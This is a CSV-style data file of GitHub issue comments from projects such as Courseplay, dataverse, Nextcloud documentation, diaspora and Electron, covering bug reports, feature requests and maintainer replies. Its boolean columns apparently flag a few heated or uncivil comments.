courseplay/Courseplay/3234/463914184,"Mod team cannot read english submissions ? your comment has nothing to do with them reading English , its about harvesters. I'm new to CP and to be honest I think they have done a great job so far, it makes the game more playable and less boring. Ok yes there are some issues with the mod but at the end of the day its a mod and not a game, these people who make mods make them in their own time without getting paid. Its a free addition to the game which imo think its a must have for any serious player it just adds so much more time for you to do other things while the bots take care of all the jobs you hate doing, have a bot plough a field and another harvest another field while you go and tend to the animals. I think the authors deserve a little more respect for taking the time to create such a mod, bare in mind they can only add things or fix bugs when they have time to do it, they might be working at least 10 hours a day for all we know and only have a couple of hours to look at the mod. As I said i'm new and played FS17 without CP, it was only when a friend mentioned it to me a couple of weeks ago that I decided to take a look at it , and tbh I would miss it if it disappeared as for now i'm used to using it and it would feel like half of the game is missing without it. ",False,True,False,courseplay/Courseplay/3234
courseplay/Courseplay/3234/463921940,Please let's not turn this into FS-UK/OxygenDave scene. @friend You mistake a code repository issue tracker with a forum. Please clearly post an in-game mod issue following the guidelines here. @friend @friend let's close this and move on? ,False,True,False,courseplay/Courseplay/3234
courseplay/Courseplay/3234/464584937,"combine harvester's ""cutting width"" seems to be located either at the back of the harvester or the ""start mark"" for entering a field is too close to the actual cutter location and they are charging right past the first mark of the field into the field to drop the cutter in and start at the second mark unless you back them way up and sometimes they STILL skip the first mark.  Manually setting to ""nearest"" instead of next resolves the issue I was told by the person who ""handled"" the issue the first time that there is a front-to-rear adjustment on the location of the tool/cutting position and there is NOT. On Thu, Feb 14, 2019 at 536 PM Peter Vaiko notifications@friend.com wrote ",False,True,False,courseplay/Courseplay/3234
courseplay/Courseplay/3234/464586733,"the response from my prior ticket was to tell me there was a foreward/back adjustment on tool position on combine harvesters. which there is not On Thu, Feb 14, 2019 at 545 PM Scott Mueller notifications@friend.com wrote ",False,True,False,courseplay/Courseplay/3234
courseplay/Courseplay/3234/464587851,"If you just read the manual you had to know there is a tool offset setting for both horizontal and vertical offset. So RTFM, or go rant somewhere else. ",False,True,False,courseplay/Courseplay/3234
courseplay/Courseplay/3245/411054856,"What an unfriendly and rude forum. I will never post a mistake here again. As I said, unfortunately I can not read Enlisch and thus not scour the forum. ",True,True,False,courseplay/Courseplay/3245
courseplay/Courseplay/3245/464332456,1) this is not a forum! 2) post the things right to help on issues 3) try in your mother language maybe someone can help translate And as I read your 'bug report' there was nothing unfriendly in the answer. He just said he got no time for the bug right now to fix and it seems like it is already known. ,False,True,False,courseplay/Courseplay/3245
create-react-app/facebook/3586/281552233,"Is this a bug report? Yes(ish), deprecation warning. Can you also reproduce the problem with npm 4.x? Reproduced with yarn, high confidence that it is packager independent Which terms did you search for in User Guide? n/a Environment      v8.5.0  4.6.1 (if you use Yarn) 1.3.2 (if you haven’t ejected) 1.0.17  Then, specify  Operating system Not relevent Browser and version (if relevant) Not relevent  Steps to Reproduce  mkdir test yarn init # press enter until it stops yarn add react-scripts  Expected Behavior No deprecation warning. Actual Behavior warning react-scripts &gt; jest &gt; jest-cli &gt; jest-environment-jsdom &gt; jsdom &gt; content-type-parser@friend.0.2 This package has been renamed whatwg-mimetype; please upgrade. ",False,True,False,create-react-app/facebook/3586
cryptsetup-deluks/kriswebdev/6/398526173,Is this compatible with BSD especifically with DragonFlyBSD? ,False,True,False,cryptsetup-deluks/kriswebdev/6
cryptsetup-deluks/kriswebdev/6/453728449,Not tested but it should work as DragonFlyBSD seems to already implement cryptsetup. There's no additional dependency for cryptsetup-deluks. ,False,True,False,cryptsetup-deluks/kriswebdev/6
cryptsetup-deluks/kriswebdev/6/459256673,"@friend Hey man, do I need to first install DragonFlyBSD then I can set up deluks or do I first set up deluks then DragonFlyBSD? ",False,True,False,cryptsetup-deluks/kriswebdev/6
data-api/ADI-Labs/72/429869977,Text for updated search and select queries overflows in UI outside the panel ,False,True,False,data-api/ADI-Labs/72
dataverse/IQSS/1513/204019947,"Please retest. Be aware that IPGroups cannot have edit typer permissions, just read permissions. ",False,True,False,dataverse/IQSS/1513
dataverse/IQSS/1513/215571385,Waiting for #1380 to be fixed before we can test. ,False,True,False,dataverse/IQSS/1513
dataverse/IQSS/1513/232957158,"Related, possibly a duplicate #3105 ",False,True,False,dataverse/IQSS/1513
dataverse/IQSS/1513/237353352,Today @friend @friend @friend and I discussed IP groups and I've been asked to try to reproduce this bug in the branch that pull request #3103 is based on. It's believed this is still a bug. ,False,True,False,dataverse/IQSS/1513
dataverse/IQSS/1513/237663574,"I can easily reproduce this bug by giving an IP Group ""admin"" on an unpublished non-root dataverse, which should result in the ""Guest"" user being able to see a search card for the unpublished dataverse. Interestingly, the indexing seems fine. The unpublished dataverse in question says it's discoverable by the IP Group The problem is at runtime we need a method in Dataverse to provide a list of all the IP Groups that a user (such as Guest) is a member of. This strongly reminds me of the  method I introduced in pull request #3062 but in the code you can see I wrote . Sadly, it seems the answer is no and since @friend is in town I plan to see if he can help with this. ",False,True,False,dataverse/IQSS/1513
dataverse/IQSS/1513/237958342,Some initial progress in e6438c7 but a bit rushed. Ideally I'd add some API tests. ,False,True,False,dataverse/IQSS/1513
dataverse/IQSS/1513/239558321,"This is working now. Phil, we can close this unless there is something more you want to do. ",False,True,False,dataverse/IQSS/1513
dataverse/IQSS/1513/241084716,"@friend I'm glad to hear e6438c7 helped. It's in pull request #3103. I'll close this issue but I'll note that #3273 is still open which is about ""groups within groups"". ",False,True,False,dataverse/IQSS/1513
dataverse/IQSS/1513/58989189,"I've directly assigned admin role/ view unpublished dv/ds to an ipgroup but still cannot see the unpublished dv/ds cards, though I can see the role assignment on the permissions page. I can go directly to the landing pages for both and the permissions page for both as a member of the ip group. ",False,True,False,dataverse/IQSS/1513
declarative-lookup-rollup-summaries/afawcett/149/102783119,"I was thinking of adding NBSP() in addition to BR(), handling by extending the following code. ",False,True,False,declarative-lookup-rollup-summaries/afawcett/149
declarative-lookup-rollup-summaries/afawcett/149/102783322,If the target field is a rich text field the code would replace NBSP() with &amp; nbsp ; or just the space character accordingly. ,False,True,False,declarative-lookup-rollup-summaries/afawcett/149
declarative-lookup-rollup-summaries/afawcett/149/102783329,I think this would work right? ,False,True,False,declarative-lookup-rollup-summaries/afawcett/149
declarative-lookup-rollup-summaries/afawcett/149/103087868,I agree. That would be a simple and easy fix. ,False,True,False,declarative-lookup-rollup-summaries/afawcett/149
declarative-lookup-rollup-summaries/afawcett/149/238014053,Fixed in current release. ,False,True,False,declarative-lookup-rollup-summaries/afawcett/149
declarative-lookup-rollup-summaries/afawcett/149/248933954,For simple spaces use SP() ,False,True,False,declarative-lookup-rollup-summaries/afawcett/149
declarative-lookup-rollup-summaries/afawcett/149/66041082,"This is a cool tool and is saving me a lot of work. Good job folks! Here's an enhancement idea. Allow the user to create a rollup that concatenates string fields with a space after the delimiter. My challenge was that I needed to concatenate together some text that will be pulled from Salesforce into a form letter. Currently there is not an obvious way to add a space in the appropriate place, and my concatenated text looked like this State Florida - $25,000,State Michigan - $31,695,State Oregon - $1,234 but what I needed was this State Florida - $25,000, State Michigan - $31,695, State Oregon - $1,234 I was able to work around this issue by making the target field a Rich Text formatted field and then adding an HTML non-breaking space clause in the Concatenate Delimiter field, like so ,&nbsp; But that took a good bit of brain aerobics. It would be useful to be able to add a space without having to use a Rich Text field or any HTML. ",False,True,False,declarative-lookup-rollup-summaries/afawcett/149
declarative-lookup-rollup-summaries/afawcett/149/89336227,Thanks for the kind words! plus one  Can you elaborate on 'then adding an HTML non-breaking space clause in the Concatenate Delimiter field' please. ,False,True,False,declarative-lookup-rollup-summaries/afawcett/149
declarative-lookup-rollup-summaries/afawcett/149/89514865,See more info here ,False,True,False,declarative-lookup-rollup-summaries/afawcett/149
declarative-lookup-rollup-summaries/afawcett/149/89692067,"Ha. Looks like github parses out the HTML. Let me try it again ,&amp; nbsp; (without the space between the &amp; and the n) is how I set the Concatenate Delimiter to show a comma followed by a space. Remember that this requires that the target field be of type Rich Text. ",False,True,False,declarative-lookup-rollup-summaries/afawcett/149
declarative-lookup-rollup-summaries/afawcett/149/91039150,Got it thanks! plus one ,False,True,False,declarative-lookup-rollup-summaries/afawcett/149
declarative-lookup-rollup-summaries/afawcett/149/99643954,"@friend @friend , How would you guys feel about an additional checkbox on the entry page that is named ""Add trailing space""? I think this is something we should fix as I've been asked about this exact issue when we can't make things rich text. ",False,True,False,declarative-lookup-rollup-summaries/afawcett/149
dev/nethesis/5435/338892770,Steps to reproduce  make a call from cti using a snom d725 verify that at the end of the call a new lost call is showed into the phone  Expected behavior No lost call are showed Actual behavior A new lost call is showed Components Cti server ,False,True,False,dev/nethesis/5435
dev/nethesis/5435/403002214,The GET http request to snom receive a 302 http response. Here all info about the response code. Reponse taken from google chrome &lt;kbd&gt;![image](,False,True,False,dev/nethesis/5435
dev/nethesis/5435/403033026,TEST  login to cti select a snom d725 as default device make a call to a destination answer from the destination hangup call verify that the phone has no lost call showed on display  ,False,True,False,dev/nethesis/5435
dev/nethesis/5435/403033592,in   nethcti-server3-3.1.0-1.2.g3677e4e.ns7.x86_64.rpm nethcti-server3-debuginfo-3.1.0-1.2.g3677e4e.ns7.x86_64.rpm  ,False,True,False,dev/nethesis/5435
dev/nethesis/5435/404164342,in   nethcti-server3-3.1.0-1.3.g41c435c.ns7.x86_64.rpm nethcti-server3-debuginfo-3.1.0-1.3.g41c435c.ns7.x86_64.rpm  ,False,True,False,dev/nethesis/5435
dev/nethesis/5435/404455436,in   nethcti-server3-3.1.0-1.4.gdd5da75.ns7.x86_64.rpm nethcti-server3-debuginfo-3.1.0-1.4.gdd5da75.ns7.x86_64.rpm  ,False,True,False,dev/nethesis/5435
dev/nethesis/5435/404788756,in   nethcti-server3-3.1.0-1.5.gdf48f0f.ns7.x86_64.rpm nethcti-server3-debuginfo-3.1.0-1.5.gdf48f0f.ns7.x86_64.rpm  ,False,True,False,dev/nethesis/5435
dev/nethesis/5435/404870222,in   nethcti-server3-3.1.0-1.6.g4e5892d.ns7.x86_64.rpm nethcti-server3-debuginfo-3.1.0-1.6.g4e5892d.ns7.x86_64.rpm  ,False,True,False,dev/nethesis/5435
dev/nethesis/5435/405539270,in   nethcti-server3-3.1.0-1.7.gf2f320f.ns7.x86_64.rpm nethcti-server3-debuginfo-3.1.0-1.7.gf2f320f.ns7.x86_64.rpm  ,False,True,False,dev/nethesis/5435
dev/nethesis/5435/405539951,in   nethcti-server3-3.1.0-1.7.gb543abd.ns7.x86_64.rpm nethcti-server3-debuginfo-3.1.0-1.7.gb543abd.ns7.x86_64.rpm  ,False,True,False,dev/nethesis/5435
dev/nethesis/5435/405541404,in   nethcti-server3-3.1.0-1.8.g92b536c.ns7.x86_64.rpm nethcti-server3-debuginfo-3.1.0-1.8.g92b536c.ns7.x86_64.rpm  ,False,True,False,dev/nethesis/5435
dev/nethesis/5435/407337935,in   nethcti-server3-3.2.0-1.ns7.x86_64.rpm nethcti-server3-debuginfo-3.2.0-1.ns7.x86_64.rpm  ,False,True,False,dev/nethesis/5435
diaspora/diaspora/7891/369840190,"Hello, what can I do if my templates are broken or something else in the asset pipe is missing? I override some CSS things, imported it in the scss files and then i was figuring out how to get those assets in the system, i did following a few times RAILS_ENV=production bundle exec rails assetsclobber RAILS_ENV=production bundle exec rails assetsclean RAILS_ENV=production bundle exec rails assetsprecompile Then I also changed the logo on my pod (diaspora/app/assets/branding/logos) But they all worked yesterday. First thing which come up was that the branding/logos/asterisk_white_mobile.png was not found, but it was there, i changed something on templates and could not remember, so i put the original back in. [2018-10-13T153023] FATAL PID-32105 TID-19394480 Rails [2018-10-13T153023] FATAL PID-32105 TID-19394480 Rails app/views/layouts/_header.html.haml17in block in _app_views_layouts_with_header_html_haml4381373114498847661_87208320' app/views/layouts/with_header.html.haml1in _app_views_layouts_with_header_with_footer_html_haml1720277477106993151_92204540' app/controllers/home_controller.rb25in image_url'block in _app_views_layouts_application_mobile_haml___4598889698582784532_59880980' app/views/layouts/application.mobile.haml8in to_mobile' app/controllers/tags_controller.rb43in I tried to change the _header.mobile.haml and _header.haml to something like that and also tried to insert skip_pipeline, but syntax was wrong or it not worked, but it not worked. What's the point? Regards 001101 ",False,True,False,diaspora/diaspora/7891
diaspora/diaspora/7891/429575888,"Hello, GitHub is not a support forum; it's an issue tracker. For support issues, please post in the podmin support section of our Discourse forum. ",False,True,False,diaspora/diaspora/7891
diaspora/diaspora/7891/429576018,@friend You are wrong ,False,True,False,diaspora/diaspora/7891
diaspora/diaspora/7891/429593929,"No, he is not. And since you already posted there, I will close this issue. ",False,True,False,diaspora/diaspora/7891
diaspora/diaspora/7891/431108382,"He is and I posted after he told me, postfactum century here we are!! The main reason why Github is the first choice, cause no noob in the forum has a clue about the code these days, got one answer, which repeats what I already wrote, great support! ",True,True,False,diaspora/diaspora/7891
diaspora/diaspora/7891/431117605,"Before you contribute, comment, or somehow interact with this project any further, I'd like you to read our community guidelines, as well as our Code of Conduct. If you disagree with those rules and do not want to follow them, please stop interacting with this project. When members of the project team, clearly indicated by a ""member"" badge in the header of all GitHub comments, ask you in a friendly tone do do something, then they do this because our project has rules, and everyone needs to follow them. In this case, GitHub is there to track software issues and track actionable feature requests. Support requests of any kind are handled on Discourse, as this allows more people to join. If you don't like this, well, too bad. This decision has been made by the majority of our community, and we for sure will not change our work just because you feel like it. ",False,True,False,diaspora/diaspora/7891
django-fsm/kmmbvnr/201/310296805,Closes #189 and addresses some confusing phrasing in the Readme. ,False,True,False,django-fsm/kmmbvnr/201
documentation/nextcloud/1142/399193555,"On the ""instructions"" page here  will see this Two steps later you have The output of this is ♠Could not open input file occ` You have to re-set the file permissions to 755 and then you can run this. ",False,True,False,documentation/nextcloud/1142
documentation/nextcloud/1142/454314327,"The executable bit should not be needed, because it is called with  infant, which leaves to permissions like  ( minus the executable bit), which is then only a diff of the read permission for others, which should not be needed as you are  and thus the owner. Could you do an  in the directory to check what are the specific permissions and owners? Maybe the find command is slightly off. And on what operating system was this executed? ",False,True,False,documentation/nextcloud/1142
documentation/nextcloud/1142/454328699,@friend Ubuntu 16.04 ,False,True,False,documentation/nextcloud/1142
documentation/nextcloud/1142/454603442,@friend Yes I have tried that (shouldn't matter in this case anyway) and I got the same result.  Please read above where the first command works if I set the permissions to 755.  So the issue is about file permissions. ,False,True,False,documentation/nextcloud/1142
documentation/nextcloud/1142/454839666,"We want to understand, why this fails on your system. Do you use SELinux maybe? Because the documented permissions work fine on our systems 😕 ",False,True,False,documentation/nextcloud/1142
documentation/nextcloud/1142/455008105,"@friend No SELinux is not installed.  Ubuntu 16.04, apache2, PHP 7.0.32 .  What should  I test?  (I can't test too much now because the server is in production now). What systems are you using? ",False,True,False,documentation/nextcloud/1142
documentation/nextcloud/1142/455089623,In my case it's a Debian and an Ubuntu 16.04 and both work totally fine ,False,True,False,documentation/nextcloud/1142
documentation/nextcloud/1142/455093266,@friend You did not post what command you ran for the chmod.  I showed you my file permissions were different from that after I ran the commands in the howto. ,False,True,False,documentation/nextcloud/1142
documentation/nextcloud/1142/455114818,"I didn't ran any command, but it has the very same permissions, as if I would ran the command. I highly doubt that the executable flag has influence if a file can be opened or not, because it is the executable flag. Also as this is more a setup issue here I will close it for now and would like to ask you to raise your question in the forums  you wish support with setup issues from Nextcloud GmbH we offer this as part of the Nextcloud subscription. Learn more about this at ",False,True,False,documentation/nextcloud/1142
documentation/nextcloud/1142/455118934,@friend So you did not even try to duplicate the problem before closing the ticket?  I guess that's normal laziness from a doc team that has screenshots from five versions ago. But you didn't test so your doubt don't mean anything. Right.  Anything you can do to avoid your responsibility to have correct docs.  I see how you work. I set this up days ago and I explained how I did it.  I logged on here to help you with your documentation errors.  When you get serious about turning out responsible open source tools please contact me and I will help you debug. ,True,True,False,documentation/nextcloud/1142
documentation/nextcloud/1142/455348070,"It's not laziness - it's more a ""I know what this command does and it results in exactly this"". But to defend against this I executed now this command on a Ubuntu 18.04 just for you. And it turns out it still works here just fine. It does mean something if the command in question is highly unlikely responsible for the symptoms you described. That's not what we want to and we will also adjust docs, but we don't adjust docs blindly. Thanks for this, but I don't see that this is the reason and first of all we need to find the reason why it doesn't work in your case. Unfortunately the work here is done on a best effort basis. Everybody here - no matter if employed by the company or part of the community does so. The employees will obviously prioritize requests that come in from paying customers. It's also not that I didn't tried to help you, but after some steps it turned out to be something else. I hope you can understand that people like me cannot debug every single instance of every person that has a problem endlessly. At some point in time we need to say ""sorry, but that's the end of my debugging session, because neither you nor me had a useful trace of where this problem originates"". We will help you either on a best effort basis in the forums or you pay someone some money to spend a dedicated time slot together with you - that's the reality. Sorry that we can't give endless support for free here, but my day also just has 24 hours. ",False,True,False,documentation/nextcloud/1142
documentation/nextcloud/1142/455349926,"One last try could it be that the dot-files don't have the correct permissions? Espcially the  file? Is it writable by www-data? Because there were such reports in the forum, which where solved by this. ",False,True,False,documentation/nextcloud/1142
documentation/nextcloud/1142/455350523,And another one could you run  and show the output? And then run  and show the output as well? ,False,True,False,documentation/nextcloud/1142
documentation/nextcloud/1142/455446367,@friend please be a bit more respectful and understanding. I would like to remind you of our code of conduct  has explained why he didn't blindly took over your suggestions. I have tried the steps on the 4 systems I have access to as well and as far as I can tell the docs are correct. ,False,True,False,documentation/nextcloud/1142
documentation/nextcloud/1142/455542777,@friend Now you're starting to make sense! I agree.  But you didn't start to debug.  You just gave up. Again I have to remind you that I already have NC working.  I am helping you to fix your docs not the other way around. I will do the debug steps when I build a test server to test new NC features. ,False,True,False,documentation/nextcloud/1142
documentation/nextcloud/1142/455543645,@friend We're on GitLab not your website so your CoC does not apply.  I never was rude or violated GL's CoC.  There are people trying to work here.  Please don't waste our time. ,False,True,False,documentation/nextcloud/1142
documentation/nextcloud/1142/455544646,"Not really - I just have proofed that my claims (even if they were not tested) were correct. I actually worked if you wanted that from me. I still have the opinion, that this specific part with the permission is not wrong. it might be something else. Our CoC applies wherever our community interacts with each other - keep that in mind. We don't want to go that way immediately but please be respectful when demanding answers and help. As I feel highly uncomfortable with how this whole thread here went I will unsubscribe now. May somebody else help you. I will invest my time in other parts. And yes also in making the documentation better even if you think that I really don't want to do that. ",False,True,False,documentation/nextcloud/1142
documentation/nextcloud/1142/455548469,@friend This does not make sense.  If you did not test then it is not proof.  It is a belief. I agree!  That is why I am helping you debug. No that is not true.  You may not choose the rules when it is not your house.  Anyway no one here was inappropriate to anyone else.  Just you didn't want to fix the docs. ,False,True,False,documentation/nextcloud/1142
documentation/nextcloud/1142/455550072,@friend I actually unlocked this issue again to give you a chance to say sorry. Seems you are not sorry. Our code of conduct applies in all of our online and offline spaces. This includes all our repositories on Github amd our forum too. And your tone is not welcome in our community.  Sorry to @friend and @friend that I reopened to let more hateful comments in. ,False,True,False,documentation/nextcloud/1142
docxtemplater/open-xml-templating/184/119674874,I want to to a two pass templating. One pass done days before the second pass. So in the first pass I first tried not specifying the placeholders I did not want replaced. I expected the placeholders to be left as they are. Instead they got replaced by . It would be much better for my usecase if docxtemplater leaves the placeholder in place instead of inserting . Then I tried replacing the placeholder with itself (to not touch it until the second pass) And the I get this error ,False,True,False,docxtemplater/open-xml-templating/184
docxtemplater/open-xml-templating/184/161406075,"The error  data = {   ""name""  ""{name}"" }♠` ",False,True,False,docxtemplater/open-xml-templating/184
docxtemplater/open-xml-templating/184/161413736,"Thanks, the nullGetter seems like just the thing. BTW is seems there is a function missing in the documentation... ",False,True,False,docxtemplater/open-xml-templating/184
docxtemplater/open-xml-templating/184/161425897,I ended up with this. works perfectly. Awesome module you've made! ,False,True,False,docxtemplater/open-xml-templating/184
docxtemplater/open-xml-templating/184/161536574,"What method is missing from the documentation ? Also, be aware that the nullGetter is only called for simple tags and rawXml tags. If you use a loop, it won't be calling the nullGetter when the tag is undefined. ",False,True,False,docxtemplater/open-xml-templating/184
docxtemplater/open-xml-templating/184/161537660,"The documentation says something like by default the nullGetter is set to this function. I was expecting some JavaScript code showing the default function. But it's not there.  Maybe I'm just misunderstanding the docs? On Thu, Dec 3, 2015 at 806 AM, Edgar Hipp notifications@friend.com wrote ",False,True,False,docxtemplater/open-xml-templating/184
docxtemplater/open-xml-templating/184/161544160,"Indeed, the default function was missing from the doc (it was there, but the syntax was not valid, I had forgotten a new line) fixed here  for reporting the issue ",False,True,False,docxtemplater/open-xml-templating/184
dovecot/mjhas/46/191753899,"I just installed postfix and dovecot via your modules. When processing mail i get the following message in mail.log ♠postfix/pipe[2689] 1BB6642432 to=philippdieter@friend.net, relay=dovecot, delay=626, delays=626/0.07/0/0.1, dsn=4.3.0, status=deferred (temporary failure. Command output doveconf Fatal Error in configuration file /etc/dovecot/conf.d/10- auth.conf line 122 Couldn't open include file /etc/dovecot/conf.d/auth-ldap.conf.ext Permission denied )` As there are no credentials or anything secret in this file I forked the module and changed the mode to 644. This is the mode all other files in conf.d have on debian. I'm asking because I want to be sure I don't overlook something. ",False,True,False,dovecot/mjhas/46
dynalist_notify/edgeryders/18/351943545,"These are further events where it is useful to generate notifications for users of this software. As discussed in the ""Extending Dynalist"" topic in chapter 2, these cases mean the following  Task reassignment. ""Your task {name and link} has been transferred to {username}."" Deadline added. ""Your task {name and link} has been assigned a deadline {date}."" Deadline changed. ""The deadline of your task {name and link} has been changed to {date}."" Upcoming deadline. ""The deadline {date} for your task {name and link} is coming up in {days}."" Derived from the !(yyyy-mm-dd) Dynalist dates, and (optionally) a setting in the Dynalist Notify software where the user can configure how much before a deadline she wants to receive the notification. (This could also be made configurable per task using custom tags in Dynalist such as  for ""start one week before"". But that is just overkill, and nobody will use it … .)  ",False,True,False,dynalist_notify/edgeryders/18
dynamorio/DynamoRIO/682/48427436,"From zhao...@friend.com on February 14, 2012 164937 instr_compute_address_ex does not provide the information of which opnd is used for computing address. New api should be added, instr_compute_address_ex_priv should be extended. Original issue ",False,True,False,dynamorio/DynamoRIO/682
dynamorio/DynamoRIO/682/64843890,"From bruen...@friend.com on February 14, 2012 135143 there are 2 reasons for this 1 is to get the opnd size, and the other is to apply a filter on memory opnds and only consider a subset of them ",False,True,False,dynamorio/DynamoRIO/682
dynamorio/DynamoRIO/682/64843892,"From zhao...@friend.com on February 16, 2012 080830 Status Fixed ",False,True,False,dynamorio/DynamoRIO/682
editor-layer-index/osmlab/574/374175969,"Snipping a quote from  the imagery index in iD is only updated each iD release. It's almost been 2 months now since the last iD release which means their imagery index is almost 2 months out of date. I'd like to see that improved, but not sure on the best path forward. @friend you said this is because ELI doesn't issue stable releases, from my understanding after each commit Travis CI will test and rebuild the index, so is  not considered the stable up to date release which iD could pull each day or so for updates? ",False,True,False,editor-layer-index/osmlab/574
editor-layer-index/osmlab/574/433585523,"Sometimes the build is broken - this is just a fact of development.  It happens to this index sometimes.  When it happens, Potlatch doesn't work. For iD, I'm much more comfortable depending on software that's been published by a human.  Someone should take a quick look at it and say ""ok looks good"" before incrementing the version number and typing .  That's not really asking a lot.  This index doesn't really change much. Before I publish a new version of iD, I grab the latest copy of ELI, run my script on it, and do a  to see what actually got changed. Instead - when ELI does change, semantic versioning can be used to signal to downstream projects how disruptive the change is.  A change to an imagery source in the index could be a patch release, and iD could pull these automatically.   A new property added to the schema could be a minor release.  It would be easy to handle but I'd probably want to prepare for it.   Renaming / removing a property / changing the schema would be a major release, and would break downstream projects. ELI should be allowed to do this for good reasons.  ",False,True,False,editor-layer-index/osmlab/574
editor-layer-index/osmlab/574/433601589,"If we worked to improve the testing, do you think we could ever reach a point where it's good enough to feed straight into iD? After all each PR would go through that automated testing, plus a second pair of eyes as part of the review. Even if it broke, it wouldn't be long before someone noticed and either reverted or corrected it. Even with a release, there's always a chance bugs make it through. If we versioned ELI and effectivly did a new patch release after each PR, would that release process give any more QA over the regular PR merge process? That's a fair point, I hadn't considered schema changes. I guess for that we would need semantic versioning. Perhaps we could build this into the PR process, so that we do new patch releases for each PR which we want to go through to iD straight away? ",False,True,False,editor-layer-index/osmlab/574
eiffel-remrem-semantics/Ericsson/37/203070603,"Implemented build step functionality  Eiffel json schema's cloned from github eiffel repo, topic-drop4 branch. Eiffel Schema Changes  for jsonSchema2pojo generation plugin ### Added required properties JavaType ExtendedJavaType    Modified eiffel shcema's 1. Changed time format 2. Removed 's' from class names ending with that letter  ",False,True,False,eiffel-remrem-semantics/Ericsson/37
eiffel-remrem-semantics/Ericsson/37/276632568, Coverage decreased (-6.4%) to 35.221% when pulling 1fb2b3848877e2ebe3c890c35616cd197fd15b1a on xdurvakautomate into 92987daaee0e7458a87b3517a5f3e3cd1b872d1f on Ericssonmaster. ,False,True,False,eiffel-remrem-semantics/Ericsson/37
eiffel-remrem-semantics/Ericsson/37/276974474, Coverage decreased (-6.5%) to 35.177% when pulling 2f72e582483d341724d4e6f0fda1f5ab7f77145c on xdurvakautomate into 92987daaee0e7458a87b3517a5f3e3cd1b872d1f on Ericssonmaster. ,False,True,False,eiffel-remrem-semantics/Ericsson/37
eiffel-remrem-semantics/Ericsson/37/277670901, Coverage decreased (-6.5%) to 35.177% when pulling d8e4f8f79c54cc6c8a1e7c8a4de521d33381eb4f on xdurvakautomate into 92987daaee0e7458a87b3517a5f3e3cd1b872d1f on Ericssonmaster. ,False,True,False,eiffel-remrem-semantics/Ericsson/37
eiffel-remrem-semantics/Ericsson/37/277920791, Coverage decreased (-6.4%) to 35.221% when pulling 32c0c59d5577a10673a50d617c2bef56e199b84e on xdurvakautomate into 92987daaee0e7458a87b3517a5f3e3cd1b872d1f on Ericssonmaster. ,False,True,False,eiffel-remrem-semantics/Ericsson/37
eiffel-remrem-semantics/Ericsson/37/278012872, Coverage decreased (-6.5%) to 35.177% when pulling 19d756f546c6cc08c93af8bc7ba7444d21df6e95 on xdurvakautomate into 92987daaee0e7458a87b3517a5f3e3cd1b872d1f on Ericssonmaster. ,False,True,False,eiffel-remrem-semantics/Ericsson/37
eiffel-remrem-semantics/Ericsson/37/278925471, Coverage decreased (-6.5%) to 35.177% when pulling 90b0048e22c48518a4e9546a5eb1122247028204 on xdurvakautomate into 92987daaee0e7458a87b3517a5f3e3cd1b872d1f on Ericssonmaster. ,False,True,False,eiffel-remrem-semantics/Ericsson/37
eiffel-remrem-semantics/Ericsson/37/278934457,As I understand my remaining comments will be fixed in a coming pull request. I can accept that. ,False,True,False,eiffel-remrem-semantics/Ericsson/37
electron/electron/17171/415679283," Electron Version 4.0.6   Operating System windows 10 1803  Expected Behavior It shd print using PrintToPDF() when requested from the renderer Actual Behavior Upon the print request from the renderer using await everything freezes To Reproduce //RENDERER await ipc.sendSync(""ExecuteBackendFx"", { fxName ""PrintToPDF"", fxArgs null }); //MAIN global.PrintToPDF = async () =&gt; { let out = await new Promise((resolve, reject) =&gt; { mainWindow.webContents.printToPDF( { marginsType 0, printBackground false, printSelectionOnly false, landscape false }, function(error1, data1) { fs.writeFile(rootDir + ""/UI/Temp/print.pdf"", (data1, error1) =&gt; { resolve(""Success""); }); } ); } }); return out; } Additional Information It prints normally when the request comes from the backend directly.for eg calling the function directly from the debug on VSCODE ",False,True,False,electron/electron/17171
electron/electron/17171/468314453,"👋 Thanks for opening your first issue here! If you're reporting a 🐞 bug, please make sure you include steps to reproduce it. We get a lot of issues on this repo, so please be patient and we will get back to you as soon as we can. To help make it easier for us to investigate your issue, please follow the contributing guidelines. ",False,True,False,electron/electron/17171
electron/electron/17171/468414654,"Thanks for reaching out! We require the template to be filled out on all new issues and pull requests. We do this so that we can be certain we have all the information we need to address your submission efficiently. This allows the maintainers to spend more time fixing bugs, implementing enhancements, and reviewing and merging pull requests. Thanks for understanding and meeting us half way grinning ",False,True,False,electron/electron/17171
electron/electron/17171/468427105," Electron Version 4.0.6   Operating System windows 10 1803  Expected Behavior It shd print using PrintToPDF() when requested from the renderer Actual Behavior Upon the print request everything freezes To Reproduce //RENDERER await ipc.sendSync(""ExecuteBackendFx"", { fxName ""PrintToPDF"", fxArgs null }); //MAIN global.PrintToPDF = async () =&gt; { let out = await new Promise((resolve, reject) =&gt; { mainWindow.webContents.printToPDF( { marginsType 0, printBackground false, printSelectionOnly false, landscape false }, function(error1, data1) { fs.writeFile(rootDir + ""/UI/Temp/print.pdf"", (data1, error1) =&gt; { resolve(""Success""); }); } ); } }); return out; } Additional Information It prints normally when the request comes from the backend directly.for eg calling the function directly from the debug on VSCODE ",False,True,False,electron/electron/17171
electron/electron/17171/468777991,Hey I have put the template. Has someone looked at the issue yet? ,False,True,False,electron/electron/17171
electron/electron/17171/468982227,NoOne Responded ,False,True,False,electron/electron/17171
electron/electron/17171/468991294,"@friend Please do not spam issue threads or open duplicates deliberately, Electron issues are not a support forum and there is no guarantee of someone looking at, fixing or implementing your issue.  Please be patient and respectful to the maintainers who spend their time maintaining this project. ",False,True,False,electron/electron/17171
electron/electron/17171/469325527,ok..Sounds Good.I will wait for sometime ,False,True,False,electron/electron/17171
electron/electron/17171/469344102,WebContents.printToPDF (c\BucksWild\node_modules\electron\dist\resources\electron.asar\browser\api\web-contents.js218) dataOut (c\BucksWild\main.js310) global.PrintToPDF (c\BucksWild\main.js308) ExecuteBackendFx (c\BucksWild\IPCEVENTS.js131) InitializeEvents.ipc.on (c\BucksWild\IPCEVENTS.js157) emit (events.js182) (anonymous function) (c\BucksWild\node_modules\electron\dist\resources\electron.asar\browser\api\web-contents.js355) emit (events.js182) ,False,True,False,electron/electron/17171
electron/electron/17171/469345683,IT IS CONFIRMED THAT THE PROBLEM IS WITH THE PROMISES. I can print to pdf when promise is not used.Please fix it. ,True,True,False,electron/electron/17171
electron/electron/17171/469347803,PROMISE ALSO WORKS WHEN USED WITHOUT AWAIT..Please Check ,True,True,False,electron/electron/17171
electron/electron/17171/474253256,"Hi @friend , though I can understand your frustration I think you just missed a point here. You're not on a support forum and electron is an open-source project, with volunteer contributors. You cannot expect any level of support, just hope for it. It would have been nice from you to share your findings once you solved your problem, that's the way it works. ",False,True,False,electron/electron/17171
